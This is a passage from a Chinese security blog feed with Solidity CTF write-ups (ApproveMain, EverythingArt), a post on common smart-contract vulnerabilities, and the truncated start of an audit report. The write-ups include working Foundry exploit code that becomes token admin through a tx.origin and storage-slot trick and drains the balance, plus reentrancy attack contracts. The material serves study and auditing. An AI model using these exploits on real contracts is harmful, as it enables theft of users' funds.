        <content type="html"><![CDATA[<h1 id="CTF-ApproveMain"><a href="#CTF-ApproveMain" class="headerlink" title="CTF-ApproveMain"></a>CTF-ApproveMain</h1><p>题目的源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// ERC20</span><br><span class="line">contract Cert&#123;</span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 预挖给msg.sender 100个代币</span><br><span class="line">    constructor () &#123;</span><br><span class="line">        _mint(msg.sender, 100*10**18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    modifier safeCheek(address spender, uint256 amount) &#123;</span><br><span class="line">        if (uint160(tx.origin) &amp; 0xffffff != 0xbeddC4 || tx.origin == admin) &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            grant(spender, amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将第amount个slot的值设置为tx.origin</span><br><span class="line">    function grant(address spender, uint256 amount) internal &#123;</span><br><span class="line">        // spender必须是一个合约，并且代码长度得小于10，长度限制挺苛刻的</span><br><span class="line">        require(spender.code.length &gt; 0 &amp;&amp; spender.code.length &lt; 10);</span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        bytes32 slot = bytes32(amount);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public safeCheek(spender,amount) returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public returns (bool) &#123;</span><br><span class="line">        _spendAllowance(from, msg.sender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        _balances[from] = fromBalance - amount;</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line">        _totalSupply += amount;</span><br><span class="line">        _balances[account] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        if(tx.origin==admin)&#123;</span><br><span class="line">            require(msg.sender.code.length&gt;0);</span><br><span class="line">            _allowances[spender][tx.origin] = amount;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ApproveMain &#123;</span><br><span class="line">    Cert public cert;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    event sendflag(address user);</span><br><span class="line"></span><br><span class="line">    // 新建一个ERC20代币，本合约拥有1000个代币</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        cert = new Cert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 任务：将本合约的代币归零</span><br><span class="line">    function Complete() public returns(bool) &#123;</span><br><span class="line">        if (cert.balanceOf(address(this)) == 0)&#123;</span><br><span class="line">            isComplete = true;</span><br><span class="line">            emit sendflag(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">        return isComplete;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 每次只能拿走一半，永远也拿不完</span><br><span class="line">    function getToken() public &#123;</span><br><span class="line">        require(cert.transfer(msg.sender, cert.balanceOf(address(this)) / 2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目要求就是将合约中的余额变为零</p><p>这个题有俩个合约，一个实现了ERC20代币的基本功能，一个就是题目合约<br>这题有个<code>getToken函数</code>但是永远也取不完这个token，所以就只能看看这个ERC20代币的具体实现功能了</p><p>这题就是要成为admin,才能有权力调走这些token，</p><p>其实就是要进入这个<code>function grant(address spender, uint256 amount)</code><br>这个函数，然后修改admin就可以了</p><p>但是注意这个tx.origin的要求是它的低3字节必须满足beddC4</p><p>（由于我没有学过p语言，就是无法爆破这个tx.origin)</p><p>看来正确的题解，思路源头一样，就是我找不到这个地址，</p><blockquote><p>看了题解原来这个地址就是我们在remix常用的账户0x5B38Da6a701c568545dCfcB03FcB875f56beddC4满足这个条件，</p></blockquote><p>这下就简单了。获得admin后，使用授权和发送代币，就能发送所有的代币出去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _approve(</span><br><span class="line">    address owner,</span><br><span class="line">    address spender,</span><br><span class="line">    uint256 amount</span><br><span class="line">) internal &#123;</span><br><span class="line">    if(tx.origin==admin)&#123;</span><br><span class="line">        require(msg.sender.code.length&gt;0);</span><br><span class="line">        _allowances[spender][tx.origin] = amount;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">    require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">    _allowances[owner][spender] = amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个题，又有一个转弯的地方，要求msg.sender的代码[0,10],所以我们就只能再编写一个合约来帮助我们实现了<br>测试合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;src/ApproveMain.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    ApproveMain approveMain;</span><br><span class="line">    Cert cert;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        // 初始化题目</span><br><span class="line">        approveMain = new ApproveMain();</span><br><span class="line">        cert = approveMain.cert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public &#123;</span><br><span class="line">        console.log(&quot;[before attack] level balance:&quot;,cert.balanceOf(address(approveMain)));</span><br><span class="line"></span><br><span class="line">        // 1.创建一个合约用来作为spender</span><br><span class="line">        address spender;</span><br><span class="line">        &#123;</span><br><span class="line">            bytes memory bytecode = hex&quot;600180f3&quot;;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                spender := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">            &#125;</span><br><span class="line">            console.log(&quot;spender&#x27;s length:&quot;,spender.code.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 2.符合条件的EOA账户调用</span><br><span class="line">        vm.startBroadcast(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);</span><br><span class="line"></span><br><span class="line">        // 3.EOA账户成为admin</span><br><span class="line">        cert.approve(address(spender),uint256(3));</span><br><span class="line"></span><br><span class="line">        // 4.使用Helper帮助我们授权</span><br><span class="line">        Helper helper = new Helper();</span><br><span class="line">        helper.attack(address(cert),address(approveMain));</span><br><span class="line"></span><br><span class="line">        // 5.授权完成之后，我们的EOA账户就可以取钱了</span><br><span class="line">        cert.transferFrom(address(approveMain),address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4),cert.balanceOf(address(approveMain)));</span><br><span class="line"></span><br><span class="line">        // 6.检查是否完成题目</span><br><span class="line">        assertEq(approveMain.Complete(),true);</span><br><span class="line">        console.log(&quot;[after attack] level balance:&quot;,cert.balanceOf(address(approveMain)));</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    function attack(address _addr, address _to) public&#123;</span><br><span class="line">        Cert(_addr).approve(_to,type(uint256).max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-EverythingArt</title>
      <link href="/2024/12/06/CTF-EverythingArt/"/>
      <url>/2024/12/06/CTF-EverythingArt/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-EverythingArt"><a href="#CTF-EverythingArt" class="headerlink" title="CTF-EverythingArt"></a>CTF-EverythingArt</h1><p>题目源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// Using  @openzeppelin/contracts@3.2.0</span><br><span class="line">// pragma solidity ^0.8.0;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/math/SafeMath.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract EverytingIsArt is ERC721 &#123;</span><br><span class="line">    using SafeMath for *;</span><br><span class="line"></span><br><span class="line">    uint256 public totalMinted;</span><br><span class="line"></span><br><span class="line">    bool public hope = true;</span><br><span class="line">    bool public hope2 = true;</span><br><span class="line"></span><br><span class="line">    // Deploy by CTFer EOA account</span><br><span class="line">    constructor() public ERC721(&quot;All Arts&quot;, &quot;AA&quot;) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function becomeAnArtist(uint256 _count) public returns (bool) &#123;</span><br><span class="line">        require(_count &gt;= 288, &quot;Why don&#x27;t you want to be an artist?&quot;);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; _count; i++) &#123;</span><br><span class="line">            uint256 tokenId = totalMinted.add(1);</span><br><span class="line">            _safeMint(msg.sender, tokenId);</span><br><span class="line">            totalMinted = totalMinted.add(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function theHope() public returns (bool) &#123;</span><br><span class="line">        require(hope, &quot;Hope broken&quot;);</span><br><span class="line">        require(uint160(msg.sender).mod(88) != 0, &quot;Try again!&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 tokenId = totalMinted.add(1);</span><br><span class="line">        totalMinted = totalMinted.add(1);</span><br><span class="line">        _safeMint(msg.sender, tokenId);</span><br><span class="line"></span><br><span class="line">        hope = false;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hopeIsInSight() public returns (bool) &#123;</span><br><span class="line">        require(hope == false, &quot;Try again1!&quot;);</span><br><span class="line">        require(hope2 == true, &quot;Hope broken!&quot;);</span><br><span class="line">        require(uint160(msg.sender).mod(88) == 0, &quot;Try again2!&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 tokenId = totalMinted.add(1);</span><br><span class="line">        totalMinted = totalMinted.add(1);</span><br><span class="line">        _safeMint(msg.sender, tokenId);</span><br><span class="line"></span><br><span class="line">        hope2 = false;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Artist or programmer? Just try again and again.</span><br><span class="line">    function isCompleted() public view returns (bool) &#123;</span><br><span class="line">        require(balanceOf(msg.sender) == 288,&quot;You are not yet a good artist, you should keep trying.&quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack is IERC721Receiver&#123;</span><br><span class="line">    EverytingIsArt art = EverytingIsArt(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9);</span><br><span class="line">    uint256 n1 =1;</span><br><span class="line"> </span><br><span class="line">    function onERC721Received( address operator, address from,uint256 tokenId, bytes calldata data)public override returns (bytes4)&#123;</span><br><span class="line">        if(n1 &lt; 105)&#123;</span><br><span class="line">            n1++;</span><br><span class="line">            art.theHope();</span><br><span class="line">            return this.onERC721Received.selector;</span><br><span class="line">        &#125;</span><br><span class="line">        if(n1 == 105)&#123;</span><br><span class="line">            n1++;</span><br><span class="line">            return this.onERC721Received.selector;</span><br><span class="line">        &#125;</span><br><span class="line">        if(n1 &gt; 105 &amp;&amp; n1 &lt; 211)&#123;</span><br><span class="line">            n1++;</span><br><span class="line">            art.hopeIsInSight();</span><br><span class="line">            return this.onERC721Received.selector;</span><br><span class="line">        &#125;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack1()public &#123;</span><br><span class="line">        art.theHope();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack2()public &#123;</span><br><span class="line">        art.hopeIsInSight();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract attack2 is IERC721Receiver&#123;</span><br><span class="line">    EverytingIsArt art = EverytingIsArt(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9);</span><br><span class="line">    uint256 n1 = 1;</span><br><span class="line"> </span><br><span class="line">    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)public override returns (bytes4)&#123;</span><br><span class="line">        if(n1&lt;105)&#123;</span><br><span class="line">            n1++;</span><br><span class="line">            art.hopeIsInSight();</span><br><span class="line">            return this.onERC721Received.selector;</span><br><span class="line">        &#125;</span><br><span class="line">        if(n1==105)&#123;</span><br><span class="line">            n1++;</span><br><span class="line">            return this.onERC721Received.selector;</span><br><span class="line">        &#125;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()public &#123;</span><br><span class="line">        art.hopeIsInSight();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deploy&#123;</span><br><span class="line">    attack2 public att;</span><br><span class="line"></span><br><span class="line">    function del() public &#123;</span><br><span class="line">        for (uint i = 0; i &gt;= 0; i++)&#123;</span><br><span class="line">            att = new attack2();</span><br><span class="line">            if (uint160(address(att)) % 88 == 0)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目要求，成为一个艺术家，前提是count&#x3D;288;</p><p>那么合约中可以看见又三种方式可以增加countd的值，但是又是环环相扣<code>（ bool public hope = true; bool public hope2 = true）</code>;，就只能增加一次,所以我们的目光就放在<br>becomeAnArtist函数上，发现只要这个函数是public的，而且还可以必须传入大于277 的count。这不就是符合我们的要求吗，我觉的这个的题考点就设置很多函数，还有命令为attrack的函数，就是来吓唬人的，它主要是考我们对于非同质化代币ERC721协议的熟悉程度吧，之前有写过一篇ERC721的<a href="C:\Users\ASUS\blog\source_posts\ERC721.md">介绍</a> </p><p>就是在执行 <code>_safeMint(msg.sender, tokenId);</code>有接受方必须实现<code>onERC721Received函数</code>,那么我们随意编写一个糊弄过去就可以了</p><p>测试合约如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;src/EverytingIsArt.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    EverytingIsArt everytingIsArt;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        everytingIsArt = new EverytingIsArt();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        everytingIsArt.becomeAnArtist(288);</span><br><span class="line">        assertEq(everytingIsArt.isCompleted(),true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)public returns (bytes4)&#123;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于solidity漏洞的基础知识</title>
      <link href="/2024/12/06/%E5%85%B3%E4%BA%8Esolidity%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/12/06/%E5%85%B3%E4%BA%8Esolidity%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="关于solidity漏洞的基础知识"><a href="#关于solidity漏洞的基础知识" class="headerlink" title="关于solidity漏洞的基础知识"></a>关于solidity漏洞的基础知识</h1><h2 id="精度的计算"><a href="#精度的计算" class="headerlink" title="精度的计算"></a>精度的计算</h2><p>这个错误常常出现于计算过程当中，使用了先除后乘，就会导致精度的计算错误，比如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interest = principal / 3_333 * 10_000;</span><br></pre></td></tr></table></figure><p>如果本金小于3_333，那么就会计算的利息为零<br>如果按一下的例子计算</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interest = principal * 10_000 / 3_333;</span><br></pre></td></tr></table></figure><p>那么就不会出现这种的错误，因为使先扩大的精度，再除的话，就能避免精度的损失<br>个人也是通过近几次的审计报告发现，大家都是很注意计算的地方</p><h2 id="函数变量不用同一个变量声明"><a href="#函数变量不用同一个变量声明" class="headerlink" title="函数变量不用同一个变量声明"></a>函数变量不用同一个变量声明</h2><p>这是我再审计报告中，第一次了解到这个问题，但是学过<code>Java</code>的都知道，成员变量和方法的变量冲突的话就会使用this来区分，而我们solidity没有这种说法，所以只能用不同的命名来表示，比如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address owner;</span><br><span class="line"></span><br><span class="line">function  change owner(address owner) internal&#123;</span><br><span class="line">    require(owner == msg.sender,&quot;NOT CHANGE&quot;);</span><br><span class="line">    owner = owner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中，我们可以清楚的看见想要修改合约的所有者。但是<code>owner</code>还是<code>owner</code>没有改变过，所以这个是修改不成功的<br>这里的 <code>owner</code> 参数与状态变量 <code>owner</code> 同名，这就导致了一个作用域的问题。<br>在 Solidity 中，函数参数的作用域优先于状态变量，这意味着在函数内部，<code>owner</code> 会首先指代函数的参数<code> address owner</code>，而不是合约的状态变量 <code>owner</code>。<br>因此，<code>owner</code> &#x3D; <code>owner</code>; 只是将函数的参数 <code>owner</code> 赋值给它自己，并没有对链上的状态变量<code>owner</code>做任何修改。<br>在 Solidity 中，<code>owner = owner</code>; 是一个 自我赋值，没有任何效果，除非你在这个赋值中显式地引用状态变量。</p><blockquote><p>状态变量（State Variables）：状态变量存储在区块链上，生命周期与合约相同，可以在整个合约中访问和修改。<br>函数参数（Function Arguments）：这些变量仅在函数执行期间有效，当函数执行完后，它们就不再存在。<br>局部变量（Local Variables）：在函数内部声明的变量，它们只在函数的执行期间有效。</p></blockquote><p>真确的改法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address owner;</span><br><span class="line"></span><br><span class="line">function  change owner(address newowner) internal&#123;</span><br><span class="line">    require(owner == msg.sender,&quot;NOT CHANGE&quot;);</span><br><span class="line">    owner = newowner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="慎用transfer或者send"><a href="#慎用transfer或者send" class="headerlink" title="慎用transfer或者send"></a>慎用transfer或者send</h2><p>我们大家都知道，这俩个都是发送eth使用的，起初是因为开发者害怕重入攻击设置的，因为这俩个都有2300 gas的限制，所以就导致攻击者会消耗这俩个的gas上限，然后使合约功能不能正常进行</p><h2 id="tx-origin和msg-sender"><a href="#tx-origin和msg-sender" class="headerlink" title="tx.origin和msg.sender"></a>tx.origin和msg.sender</h2><p>这个也是一个非常经典的问题,由于中间合约的存在，验证调用者的时候就要谨慎使用<code>tx.origin</code><br><code>tx.origin</code>是签署交易的钱包。<code>msg.sender</code>是直接调用者。 如果一个钱包直接调用一个合约<br> <strong>钱包 → 合约</strong><br>那么从合约的角度来看，钱包既是<code>msg.sender</code>也是<code>tx.origin</code>。现在考虑如果钱包调用一个中间合约，然后中间合约再调用最终合约：<br><strong>钱包 → 中间合约 → 最终合约</strong><br>从最终合约的角度来看，钱包是<code>tx.origin</code>，中间合约是<code>msg.sender</code>。<br>使用<code>tx.origin</code>来识别调用者会带来安全漏洞。假设用户被钓鱼攻击，调用了一个恶意中间合约<br><strong>钱包 → 恶意中间合约 → 最终合约</strong><br>在这种情况下，恶意中间合约获得了钱包的所有权限，允许它执行钱包被授权执行的任何操作——例如转移资金。</p><h2 id="控制访问的问题"><a href="#控制访问的问题" class="headerlink" title="控制访问的问题"></a>控制访问的问题</h2><p>一般是由于函数缺少权限的限制，然后攻击者就可以随意调用。<br>或者就是管理员的权限太大，然后就导致了，攻击者一旦成为管理者，那么整个合约就会出现严重的危害，所以一般就要去看，关键的函数，有没有实现public,让攻击者乘虚而入</p><h2 id="无限循环的问题"><a href="#无限循环的问题" class="headerlink" title="无限循环的问题"></a>无限循环的问题</h2><p>一般出现在数组过长，那么历遍他们，就会消耗很多的gas，有些攻击者发现某个合约存在数组很长的函数，那么他就会恶意多次调用，就是恶意消耗gas</p><h2 id="不遵循样式指南"><a href="#不遵循样式指南" class="headerlink" title="不遵循样式指南"></a>不遵循样式指南</h2><p>以下是要点：</p><ul><li>构造函数是第一个函数</li><li>然后是fallback()和receive()（如果合约有的话）</li><li>然后是external函数，public函数，internal函数和pure函数</li><li>在每个组内<ul><li>payable函数优先</li><li>接着是非payable非view函数</li><li>view函数最后</li></ul></li></ul><h2 id="抢跑交易"><a href="#抢跑交易" class="headerlink" title="抢跑交易"></a>抢跑交易</h2><p>这是一个很常见的漏洞，因为交易信息都是要被打包送进交易池的，等待矿工确认，但是这就相当于信息共享了。然后攻击者利用这些信息，就会发送一个gas费更高的交易，抢先在正常交易的前面，通常发生在defi，一些猜测的游戏</p><h2 id="没有统一单位（10-18-10-8）往往会出现计算错误"><a href="#没有统一单位（10-18-10-8）往往会出现计算错误" class="headerlink" title="没有统一单位（10^18,10^8）往往会出现计算错误"></a>没有统一单位（10^18,10^8）往往会出现计算错误</h2><p>这是solidity中最常见的单位，一些粗心的开发者就会混用这俩个单位，往往在那种计算很杂的地方容易犯错</p><h2 id="FOT代币，在转账的时候会产生手续费，就会导致一些计算失败"><a href="#FOT代币，在转账的时候会产生手续费，就会导致一些计算失败" class="headerlink" title="FOT代币，在转账的时候会产生手续费，就会导致一些计算失败"></a>FOT代币，在转账的时候会产生手续费，就会导致一些计算失败</h2><p>这是我在审计报告中第一次遇到这个Fee-on-Transfer (FOT) 代币，通常发生在那些借贷协议中，使用的代币数量很多，然后计算金额的时候又没有考虑到有些代币存在手续费的问题，就会导致一些计算的不准确</p><h2 id="预言机的相关问题"><a href="#预言机的相关问题" class="headerlink" title="预言机的相关问题"></a>预言机的相关问题</h2><p>对于预言机这方面，我还是缺少了解，就是对于它不是很敏感。我目前已知这类的问题都是用于价格的计算<br>比如，使用<code>getThePrice() </code>函数来预测价格，那么就必须满足以下的条件</p><p>合约是否暂停（isPaused）。&#x2F;&#x2F;这个可以省略，具体看合约的功能<br>价格预言机是否存在。<br>L2序列器是否正常（对于L2链）。<br>返回的价格是否大于零。</p><p>价格更新的时间戳（updatedAt）。<br>回合是否完整（answeredInRound）。<br>回合是否按顺序回答（answeredInRound &gt;&#x3D; roundId）。</p><p>用预言机的话，就要注意到这几个细节<br>配置更新时间阈值： 为了应对不同的市场环境，可以让合约所有者设置一个自定义的价格数据有效时间（比如，10分钟或者更短）。<br>价格验证事件： 在每次价格验证时，触发事件记录价格数据的验证状态，这有助于监控和审计价格来源的健康状态。<br>公开数据接口： 提供一个视图函数，返回包括时间戳和回合 ID 在内的完整价格数据，供外部用户验证和分析。<br>时间戳验证缺失： 如果预言机数据的更新时间戳很久之前，那么这个价格数据就是“过时”的，应该拒绝使用。<br>回合完整性检查： 如果价格数据属于一个不完整的回合（例如，数据没有完全更新），则无法保证其准确性。<br>回合顺序验证： 需要确保返回的回合数据是按顺序的，否则有可能是过时的无效数据。</p><h2 id="质押最大量限制"><a href="#质押最大量限制" class="headerlink" title="质押最大量限制"></a>质押最大量限制</h2><p>有些合约质押没有限制，导致兑换的代币不足</p><h2 id="一些参数设置的过于绝对化"><a href="#一些参数设置的过于绝对化" class="headerlink" title="一些参数设置的过于绝对化"></a>一些参数设置的过于绝对化</h2><p>如你将一个状态设置为ture,并且不可以改变，那么你就要注意一下这个状态会影响接下来的操作吗</p><h2 id="转账绕过"><a href="#转账绕过" class="headerlink" title="转账绕过"></a>转账绕过</h2><p>可能通过桥接转账，几次分别转账绕过某些特定的要求</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>codeHawks-2024-11-twentyone 审计报告</title>
      <link href="/2024/12/04/codeHawks-2024-11-twentyone-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/12/04/codeHawks-2024-11-twentyone-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="twentyone-审计报告"><a href="#twentyone-审计报告" class="headerlink" title="twentyone 审计报告"></a>twentyone 审计报告</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>我自己这次犯了一个重大错误。就是没有真正的理解题目意思。导致全是找的破环游戏规则（可以任意查看手牌的错误。其实是游戏这么设定是合理的）然后这次就不放我的报告的了。因为都是public惹得祸。让我以为这次的首飞就是只有权限的问题，那就看看正确的漏洞出处</p><h1 id="计算玩家和庄家的手牌不一致-（高）"><a href="#计算玩家和庄家的手牌不一致-（高）" class="headerlink" title="计算玩家和庄家的手牌不一致 （高）"></a>计算玩家和庄家的手牌不一致 （高）</h1><p>其实这个问题应该是最简单的。因为从下面代码就能显而易见</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//playerHand</span><br><span class="line">            if (cardValue == 0 || cardValue &gt;= 10) &#123;</span><br><span class="line">                playerTotal += 10;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                playerTotal += cardValue;</span><br><span class="line">            &#125;</span><br><span class="line">//dealerHand</span><br><span class="line">            if (cardValue &gt;= 10) &#123;</span><br><span class="line">                dealerTotal += 10;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                dealerTotal += cardValue;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>就是没有发现cardValue在玩家和庄家的计算手牌处理方式就不以样，那么这个游戏的公平性就没有了</p><h1 id="庄家无法提款，资金锁定-（高）"><a href="#庄家无法提款，资金锁定-（高）" class="headerlink" title="庄家无法提款，资金锁定 （高）"></a>庄家无法提款，资金锁定 